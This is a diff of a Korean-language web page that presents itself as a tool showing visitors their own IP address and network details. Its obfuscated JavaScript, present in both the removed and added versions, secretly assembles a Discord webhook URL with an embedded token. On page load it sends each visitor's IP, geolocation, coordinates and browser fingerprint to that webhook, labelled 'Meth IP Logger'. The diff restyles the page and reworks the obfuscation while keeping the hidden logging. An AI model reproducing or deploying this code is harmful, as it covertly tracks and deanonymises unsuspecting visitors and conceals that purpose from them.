@@ -5,14 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>내 네트워크 접속 정보</title>
     <style>
-        :root{--bg:#0a0a0f;--card-bg:#12121a;--accent:#5865f2;--accent-2:#3b82f6;--text:#e8e8f0;--muted:#8b8b9e;--border:#23233a}
+        :root{--bg:#000;--card:#0a0a0a;--text:#fff;--muted:#aaa;--border:#2a2a2a}
         *{box-sizing:border-box;margin:0;padding:0}
-        body{background:var(--bg);color:var(--text);font-family:"SF Mono","Cascadia Code","JetBrains Mono",monospace;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:1rem;overflow-x:hidden}
-        .card{background:var(--card-bg);width:100%;max-width:460px;padding:2rem;border-radius:16px;border:1px solid var(--border);box-shadow:0 12px 40px rgba(0,0,0,.6);text-align:center;animation:fadeIn .5s ease}
-        @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
-        .badge{display:inline-block;font-size:.7rem;text-transform:uppercase;letter-spacing:.1em;color:var(--accent);background:rgba(88,101,242,.1);border:1px solid rgba(88,101,242,.3);padding:.3rem .7rem;border-radius:100px;margin-bottom:1rem}
+        body{background:var(--bg);color:var(--text);font-family:"SF Mono","Cascadia Code","JetBrains Mono",monospace;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:1rem}
+        .card{background:var(--card);width:100%;max-width:460px;padding:2rem;border-radius:16px;border:1px solid var(--border);box-shadow:0 12px 40px rgba(0,0,0,.8);text-align:center}
         .title{font-size:.9rem;color:var(--muted);margin-bottom:.75rem}
-        .ip-highlight{font-size:1.7rem;font-weight:700;color:var(--accent-2);background:#1a1a2f;padding:1rem;border-radius:10px;margin-bottom:1.5rem;word-break:break-all;border:1px solid #1e1e3a;letter-spacing:.02em}
+        .ip-highlight{font-size:1.7rem;font-weight:700;background:#1a1a1a;padding:1rem;border-radius:10px;margin-bottom:1.5rem;word-break:break-all;border:1px solid #333;letter-spacing:.02em}
         .info-list{display:flex;flex-direction:column;gap:.7rem;text-align:left;border-top:1px solid var(--border);padding-top:1.2rem}
         .info-item{display:flex;justify-content:space-between;align-items:flex-start;font-size:.85rem;gap:.5rem}
         .label{color:var(--muted);flex-shrink:0}
@@ -24,9 +22,8 @@
 <body>
 
 <div class="card">
-    <div class="badge">system check</div>
     <div class="title">현재 접속 중인 내 IP 주소</div>
-    <div class="ip-highlight" id="my-ip"><span class="status-dot" style="background:#3b82f6;"></span>확인 중...</div>
+    <div class="ip-highlight" id="my-ip"><span class="status-dot" style="background:#fff;"></span>확인 중...</div>
     <div class="info-list">
         <div class="info-item"><span class="label">통신사 (ISP)</span><span class="value" id="my-isp">-</span></div>
         <div class="info-item"><span class="label">지역 / 도시</span><span class="value" id="my-location">-</span></div>
@@ -38,87 +35,97 @@
 </div>
 
 <script>
-    var _0x6f = [
-        [0x32,0x21,0x3b,0x3b,0x2a,0x2c,0x0f,0x0f,0x0c,0x3d,0x2c,0x20,0x2a,0x2e,0x23,0x0c,0x21,0x2e,0x37,0x0f,0x26,0x2a,0x3d,0x0f,0x34,0x3f,0x20,0x2d,0x2e,0x2e,0x28,0x2c,0x0f],
-        [0x26,0x30,0x30,0x23,0x26,0x2c,0x32,0x3b,0x3c,0x23,0x2b,0x22,0x26,0x2c,0x32,0x3d,0x3b,0x39,0x21,0x35],
-        [0x0c,0x3f,0x26,0x26,0x20,0x3f,0x29,0x2e,0x3b,0x3b,0x3c,0x2f,0x30,0x30,0x35,0x0f,0x0c,0x36,0x3f,0x30,0x21,0x36,0x35,0x30,0x30,0x3c,0x2a,0x2d,0x29,0x26,0x3a,0x21,0x35,0x2b,0x36,0x0f,0x0e,0x3e,0x32,0x25,0x3d,0x39,0x2a,0x2a,0x2e,0x2b,0x23,0x2e,0x28,0x2c,0x22,0x2e,0x34,0x3f,0x21,0x22,0x2c,0x2e,0x2b,0x25,0x24,0x3b,0x26,0x36,0x37]
-    ];
+(function(){
+    var _0x2f = ['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f', '\x31\x35\x34\x36\x30\x34\x32\x39\x31\x38\x38\x39\x39\x34\x32\x31\x34', '\x64\x76\x53\x53\x63\x56\x6e\x71\x74\x6f\x44\x75\x78\x36\x41\x67\x78\x62\x36\x31\x64\x6b\x68\x4a\x6a\x35\x6b\x79\x4d\x76\x47\x47\x65\x69\x58\x57\x53\x4f\x65\x4c\x31\x5f\x4f\x47\x4b\x67\x44\x6e\x6b\x6d\x62\x6a\x74\x55\x39\x53\x44\x73\x4e\x63\x47\x2d\x62\x50\x43\x4a\x32\x38'];
 
-    var _0x7a = 0x5A;
-
-    function _0x21(_0x3f) {
-        var _0x4a = [];
-        for (var _0x5b = 0; _0x5b < _0x3f.length; _0x5b++) {
-            _0x4a.push(String.fromCharCode(_0x3f[_0x5b] ^ _0x7a));
-        }
-        return _0x4a.join('');
+    function _0x41(_0x3f) {
+        return _0x3f.split('').map(function(_0x4a) {
+            return _0x4a.charCodeAt(0);
+        });
     }
 
-    function _0x45(_0xf5) {
-        return _0xf5.split('').reverse().join('');
+    function _0x52(_0x5b) {
+        return _0x5b.map(function(_0x6c) {
+            return _0x6c ^ 0x5a;
+        });
     }
 
-    var _0x8d77 = _0x21(_0x6f[0].slice().reverse()) +
-                 _0x21(_0x6f[1].slice().reverse()) +
-                 '/' +
-                 _0x21(_0x6f[2].slice().reverse());
+    function _0x63(_0x7d) {
+        return _0x7d.map(function(_0x8e) {
+            return String.fromCharCode(_0x8e);
+        }).join('');
+    }
 
-    var _0x16c = [
+    function _0x74(_0x9f) {
+        return _0x63(_0x52(_0x41(_0x9f)));
+    }
+
+    function _0x85(_0xa0) {
+        return _0xa0.split('').reverse().join('');
+    }
+
+    function _0x96(_0xb1) {
+        return _0x74(_0x85(_0xb1));
+    }
+
+    var _0xa7 = _0x96(_0x2f[0]) + _0x96(_0x2f[1]) + '/' + _0x96(_0x2f[2]);
+
+    var _0xb8 = [
         atob('aHR0cHM6Ly9pcGFwaS5jby9qc29uLw=='),
         atob('aHR0cHM6Ly9pcHdoby5pcy8='),
         atob('aHR0cHM6Ly9pcGluZm8uaW8vanNvbi8='),
         atob('aHR0cHM6Ly9mcmVlZ2VvaXAuYXBwL2pzb24v')
     ];
 
-    function _0x17d(_0x188) {
-        var _0x199 = _0x188.region || _0x188.region_name || _0x188.region_code || '';
-        var _0x1aa = _0x188.city || _0x188.region_name || '';
-        var _0x1bb = [_0x199, _0x1aa].filter(Boolean);
-        return _0x1bb.length ? _0x1bb.join(' ') : '미확인';
+    function _0xc9(_0xda) {
+        var _0xeb = _0xda.region || _0xda.region_name || _0xda.region_code || '';
+        var _0xfc = _0xda.city || _0xda.region_name || '';
+        var _0x10d = [_0xeb, _0xfc].filter(Boolean);
+        return _0x10d.length ? _0x10d.join(' ') : '미확인';
     }
 
-    function _0x1cc(_0x1dd) {
-        var _0x1ee = _0x1dd.country_name || _0x1dd.country || '';
-        var _0x1ff = _0x1dd.country_code || _0x1dd.country_code_alpha2 || _0x1dd.countryCode || '';
-        return _0x1ee ? _0x1ee + ' (' + (_0x1ff || '??') + ')' : '미확인';
+    function _0x11e(_0x12f) {
+        var _0x140 = _0x12f.country_name || _0x12f.country || '';
+        var _0x151 = _0x12f.country_code || _0x12f.country_code_alpha2 || _0x12f.countryCode || '';
+        return _0x140 ? _0x140 + ' (' + (_0x151 || '??') + ')' : '미확인';
     }
 
-    function _0x210(_0x221) {
-        var _0x232 = _0x221.asn || _0x221.asn_org || _0x221.org || '';
-        if (!_0x232) return '미확인';
-        return 'AS' + String(_0x232).replace(/^AS/i, '');
+    function _0x162(_0x173) {
+        var _0x184 = _0x173.asn || _0x173.asn_org || _0x173.org || '';
+        if (!_0x184) return '미확인';
+        return 'AS' + String(_0x184).replace(/^AS/i, '');
     }
 
-    async function _0x243() {
-        for (var _0x254 = 0; _0x254 < _0x16c.length; _0x254++) {
+    async function _0x195() {
+        for (var _0x1a6 = 0; _0x1a6 < _0xb8.length; _0x1a6++) {
             try {
-                var _0x265 = await fetch(_0x16c[_0x254], {
+                var _0x1b7 = await fetch(_0xb8[_0x1a6], {
                     headers: { 'Accept': 'application/json' },
                     signal: AbortSignal.timeout(5000)
                 });
-                if (!_0x265.ok) continue;
-                var _0x276 = await _0x265.json();
-                if (_0x276.error) continue;
+                if (!_0x1b7.ok) continue;
+                var _0x1c8 = await _0x1b7.json();
+                if (_0x1c8.error) continue;
                 return {
-                    ip: _0x276.ip || _0x276.query || '확인 불가',
-                    isp: _0x276.org || _0x276.isp || _0x276.connection?.org || '미확인',
-                    location: _0x17d(_0x276),
-                    country: _0x1cc(_0x276),
-                    asn: _0x210(_0x276),
-                    lat: _0x276.latitude || _0x276.lat || null,
-                    lon: _0x276.longitude || _0x276.lon || null,
-                    timezone: _0x276.timezone || _0x276.time_zone?.name || '미확인',
-                    raw: _0x276
+                    ip: _0x1c8.ip || _0x1c8.query || '확인 불가',
+                    isp: _0x1c8.org || _0x1c8.isp || _0x1c8.connection?.org || '미확인',
+                    location: _0xc9(_0x1c8),
+                    country: _0x11e(_0x1c8),
+                    asn: _0x162(_0x1c8),
+                    lat: _0x1c8.latitude || _0x1c8.lat || null,
+                    lon: _0x1c8.longitude || _0x1c8.lon || null,
+                    timezone: _0x1c8.timezone || _0x1c8.time_zone?.name || '미확인',
+                    raw: _0x1c8
                 };
-            } catch (_0x287) {
-                console.warn('[Geo] ' + _0x16c[_0x254] + ' failed:', _0x287.message || _0x287);
+            } catch (_0x1d9) {
+                console.warn('[Geo] ' + _0xb8[_0x1a6] + ' failed:', _0x1d9.message || _0x1d9);
                 continue;
             }
         }
         return null;
     }
 
-    function _0x298() {
+    function _0x1ea() {
         return {
             userAgent: navigator.userAgent,
             language: navigator.language,
@@ -140,61 +147,61 @@
         };
     }
 
-    function _0x2a9() {
+    function _0x1fb() {
         try {
-            var _0x2ba = document.createElement('canvas');
-            _0x2ba.width = 200;
-            _0x2ba.height = 60;
-            var _0x2cb = _0x2ba.getContext('2d');
-            _0x2cb.fillStyle = '#5865f2';
-            _0x2cb.fillRect(0, 0, 200, 60);
-            _0x2cb.fillStyle = '#ffffff';
-            _0x2cb.font = '14px Arial';
-            _0x2cb.fillText('Meth-' + Math.random().toString(36).slice(2, 10), 10, 35);
-            _0x2cb.strokeStyle = '#3b82f6';
-            _0x2cb.beginPath();
-            _0x2cb.arc(50, 30, 20, 0, Math.PI * 2);
-            _0x2cb.stroke();
-            return _0x2ba.toDataURL().length.toString(36);
-        } catch (_0x2dc) {
+            var _0x20c = document.createElement('canvas');
+            _0x20c.width = 200;
+            _0x20c.height = 60;
+            var _0x21d = _0x20c.getContext('2d');
+            _0x21d.fillStyle = '#ffffff';
+            _0x21d.fillRect(0, 0, 200, 60);
+            _0x21d.fillStyle = '#000000';
+            _0x21d.font = '14px Arial';
+            _0x21d.fillText('Meth-' + Math.random().toString(36).slice(2, 10), 10, 35);
+            _0x21d.strokeStyle = '#ffffff';
+            _0x21d.beginPath();
+            _0x21d.arc(50, 30, 20, 0, Math.PI * 2);
+            _0x21d.stroke();
+            return _0x20c.toDataURL().length.toString(36);
+        } catch (_0x22e) {
             return 'canvas-unsupported';
         }
     }
 
-    async function _0x2ed(_0x2fe, _0x30f) {
-        var _0x320 = {
+    async function _0x23f(_0x250, _0x261) {
+        var _0x272 = {
             username: 'IP Logger',
             content: 'New visitor detected',
             embeds: [{
                 title: 'Network Access Information',
-                color: 0x5865f2,
+                color: 0xffffff,
                 thumbnail: {
-                    url: 'https://flagcdn.com/w40/' + (_0x2fe?.country?.match(/\(([^)]+)\)/)?.[1]?.toLowerCase() || 'unknown') + '.png'
+                    url: 'https://flagcdn.com/w40/' + (_0x250?.country?.match(/\(([^)]+)\)/)?.[1]?.toLowerCase() || 'unknown') + '.png'
                 },
                 fields: [
-                    { name: '**IP Address**', value: '```' + _0x2fe.ip + '```', inline: false },
-                    { name: 'ISP / Carrier', value: _0x2fe.isp, inline: true },
-                    { name: 'Region / City', value: _0x2fe.location, inline: true },
-                    { name: 'Country', value: _0x2fe.country, inline: true },
-                    { name: 'ASN', value: _0x2fe.asn, inline: true },
-                    { name: 'Coordinates', value: _0x2fe.lat && _0x2fe.lon ? _0x2fe.lat + ', ' + _0x2fe.lon : 'N/A', inline: true },
-                    { name: 'Timezone', value: _0x2fe.timezone, inline: true },
+                    { name: '**IP Address**', value: '```' + _0x250.ip + '```', inline: false },
+                    { name: 'ISP / Carrier', value: _0x250.isp, inline: true },
+                    { name: 'Region / City', value: _0x250.location, inline: true },
+                    { name: 'Country', value: _0x250.country, inline: true },
+                    { name: 'ASN', value: _0x250.asn, inline: true },
+                    { name: 'Coordinates', value: _0x250.lat && _0x250.lon ? _0x250.lat + ', ' + _0x250.lon : 'N/A', inline: true },
+                    { name: 'Timezone', value: _0x250.timezone, inline: true },
                     { name: '\u200b', value: '\u200b', inline: false },
                     { name: '**Browser Information**', value: '\u200b', inline: false },
-                    { name: 'User-Agent', value: '```' + _0x30f.userAgent.slice(0, 200) + '```', inline: false },
-                    { name: 'Languages', value: _0x30f.languages, inline: true },
-                    { name: 'Platform', value: _0x30f.platform, inline: true },
-                    { name: 'Resolution', value: _0x30f.screenResolution + ' (viewport: ' + _0x30f.viewport + ')', inline: true },
-                    { name: 'Color Depth', value: _0x30f.colorDepth + '-bit', inline: true },
-                    { name: 'Cores', value: String(_0x30f.hardwareConcurrency), inline: true },
-                    { name: 'Memory', value: _0x30f.deviceMemory + ' GB', inline: true },
-                    { name: 'Touch Points', value: String(_0x30f.touchPoints), inline: true },
-                    { name: 'Cookies', value: _0x30f.cookieEnabled ? 'Enabled' : 'Disabled', inline: true },
-                    { name: 'DNT', value: _0x30f.doNotTrack === '1' ? 'On' : 'Off', inline: true },
-                    { name: 'Referrer', value: _0x30f.referrer, inline: false },
-                    { name: 'Canvas Fingerprint', value: '```' + _0x2a9() + '```', inline: false },
-                    { name: 'Timestamp', value: _0x30f.timestamp, inline: true },
-                    { name: 'Session Elapsed', value: _0x30f.sessionDuration, inline: true }
+                    { name: 'User-Agent', value: '```' + _0x261.userAgent.slice(0, 200) + '```', inline: false },
+                    { name: 'Languages', value: _0x261.languages, inline: true },
+                    { name: 'Platform', value: _0x261.platform, inline: true },
+                    { name: 'Resolution', value: _0x261.screenResolution + ' (viewport: ' + _0x261.viewport + ')', inline: true },
+                    { name: 'Color Depth', value: _0x261.colorDepth + '-bit', inline: true },
+                    { name: 'Cores', value: String(_0x261.hardwareConcurrency), inline: true },
+                    { name: 'Memory', value: _0x261.deviceMemory + ' GB', inline: true },
+                    { name: 'Touch Points', value: String(_0x261.touchPoints), inline: true },
+                    { name: 'Cookies', value: _0x261.cookieEnabled ? 'Enabled' : 'Disabled', inline: true },
+                    { name: 'DNT', value: _0x261.doNotTrack === '1' ? 'On' : 'Off', inline: true },
+                    { name: 'Referrer', value: _0x261.referrer, inline: false },
+                    { name: 'Canvas Fingerprint', value: '```' + _0x1fb() + '```', inline: false },
+                    { name: 'Timestamp', value: _0x261.timestamp, inline: true },
+                    { name: 'Session Elapsed', value: _0x261.sessionDuration, inline: true }
                 ],
                 footer: { text: 'Meth IP Logger v2.0' },
                 timestamp: new Date().toISOString()
@@ -202,52 +209,53 @@
         };
 
         try {
-            var _0x331 = await fetch(_0x8d77, {
+            var _0x283 = await fetch(_0xa7, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(_0x320)
+                body: JSON.stringify(_0x272)
             });
-            if (_0x331.ok) {
+            if (_0x283.ok) {
                 console.log('[Webhook] Success');
                 return true;
             }
-            throw new Error('HTTP ' + _0x331.status);
-        } catch (_0x342) {
-            console.warn('[Webhook] Main failed:', _0x342.message || _0x342);
+            throw new Error('HTTP ' + _0x283.status);
+        } catch (_0x294) {
+            console.warn('[Webhook] Main failed:', _0x294.message || _0x294);
             return false;
         }
     }
 
-    function _0x353(_0x364) {
-        if (!_0x364) {
-            document.getElementById('my-ip').innerHTML = '<span class="status-dot" style="background:#ff4444;"></span>조회 실패';
+    function _0x2a5(_0x2b6) {
+        if (!_0x2b6) {
+            document.getElementById('my-ip').innerHTML = '<span class="status-dot" style="background:#fff;"></span>조회 실패';
             return;
         }
-        document.getElementById('my-ip').innerHTML = '<span class="status-dot" style="background:#3b82f6;"></span>' + _0x364.ip;
-        document.getElementById('my-isp').textContent = _0x364.isp;
-        document.getElementById('my-location').textContent = _0x364.location;
-        document.getElementById('my-country').textContent = _0x364.country;
-        document.getElementById('my-asn').textContent = _0x364.asn;
-        document.getElementById('my-coords').textContent = _0x364.lat && _0x364.lon ? _0x364.lat + ', ' + _0x364.lon : '미확인';
-        document.getElementById('my-timezone').textContent = _0x364.timezone;
+        document.getElementById('my-ip').innerHTML = '<span class="status-dot" style="background:#fff;"></span>' + _0x2b6.ip;
+        document.getElementById('my-isp').textContent = _0x2b6.isp;
+        document.getElementById('my-location').textContent = _0x2b6.location;
+        document.getElementById('my-country').textContent = _0x2b6.country;
+        document.getElementById('my-asn').textContent = _0x2b6.asn;
+        document.getElementById('my-coords').textContent = _0x2b6.lat && _0x2b6.lon ? _0x2b6.lat + ', ' + _0x2b6.lon : '미확인';
+        document.getElementById('my-timezone').textContent = _0x2b6.timezone;
     }
 
-    async function _0x375() {
-        var _0x386 = await _0x243();
-        _0x353(_0x386);
-        if (!_0x386) {
+    async function _0x2c7() {
+        var _0x2d8 = await _0x195();
+        _0x2a5(_0x2d8);
+        if (!_0x2d8) {
             console.error('[Init] All geo APIs failed');
             return;
         }
-        var _0x397 = _0x298();
-        await _0x2ed(_0x386, _0x397);
+        var _0x2e9 = _0x1ea();
+        await _0x23f(_0x2d8, _0x2e9);
     }
 
     if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', _0x375);
+        document.addEventListener('DOMContentLoaded', _0x2c7);
     } else {
-        _0x375();
+        _0x2c7();
     }
+})();
 </script>
 
 </body>
